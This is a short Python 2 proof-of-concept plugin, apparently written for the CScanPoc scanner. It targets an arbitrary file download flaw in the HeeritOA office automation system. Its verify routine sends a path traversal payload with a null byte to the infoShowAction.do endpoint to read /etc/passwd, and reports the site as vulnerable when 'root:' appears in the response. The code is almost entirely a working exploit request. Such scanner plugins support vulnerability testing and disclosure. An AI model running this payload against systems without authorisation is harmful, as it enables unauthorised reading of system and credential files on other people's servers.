# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'HeeritOA_0000' # 平台漏洞编号，留空
    name = '北京希尔自动化OA管理系统/数据库系统 /bnuoa/info/infoShowAction.do 任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-07-24'  # 漏洞公布时间
    desc = '''
        北京希尔自动化OA管理系统/数据库系统 /bnuoa/info/infoShowAction.do 任意文件下载漏洞
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=058386' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'HeeritOA(希尔OA)'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9c3f7de2-814f-49a5-97a0-7ff12f5d537a'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ('/bnuoa/info/infoShowAction.do?accessory=1&id='
                                                  '../../../../../../../../../../etc/passwd%00.jpg&method=getAccessory')
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            if "root:" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()